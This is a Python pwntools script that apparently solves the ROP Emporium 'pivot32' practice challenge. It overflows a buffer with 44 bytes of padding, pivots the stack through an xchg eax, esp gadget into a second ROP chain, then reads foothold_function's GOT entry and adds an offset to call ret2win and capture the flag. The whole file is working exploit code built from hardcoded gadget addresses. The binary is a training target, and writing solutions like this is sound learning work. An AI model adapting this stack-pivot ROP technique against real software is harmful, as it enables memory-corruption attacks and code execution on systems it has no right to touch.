from pwn import *
import re

e = ELF('./pivot32')
p = e.process()

# raw_input('attach gdb')

recvd = p.recv().decode()

# address where longer chain is written
addr = re.findall('0x[0-9a-f]{8}', recvd)[0]
addr = int(addr, 16)
addr = p32(addr)

# dynamically imported function - foothold_function
foothold_plt = p32(0x80485f0)
foothold_got = p32(0x804a024)

# offset for ret2win function from foothold_function
# calculated using objdump: 00000967 - 00000770
offset = p32(0x1f7)

# padding for buffer overflow
padding = b'A' * 44

# gadgets
# pop eax ; ret
pop_eax = p32(0x080488c0)

# call eax
call_eax = p32(0x080486a3)

# mov eax, dword ptr [eax] ; ret
eax_val = p32(0x080488c4)

# xchg eax, esp ; ret
xchg = p32(0x080488c2)

# pop ebx ; ret
pop_ebx = p32(0x08048571)

# add eax, ebx ; ret
add = p32(0x080488c7)

# short chain for overflowing stack and pivoting stack to longer chain
# achieved by swapping eax and esp
short = padding
short += pop_eax
short += addr
short += xchg

# new stack - longer chain
# call to foothold_plt to populate the got entry
long = foothold_plt

# move address of got to eax
long += pop_eax
long += foothold_got

# get value of got in eax
long += eax_val

# load offset to ebx
long += pop_ebx
long += offset

# add offset to eax (got entry of foothold_function)
long += add

# call eax (address of ret2win)
long += call_eax

p.sendline(long)
print(p.recv().decode())
p.sendline(short)

print(p.recv().decode())
flag = p.recv().decode()

success(flag)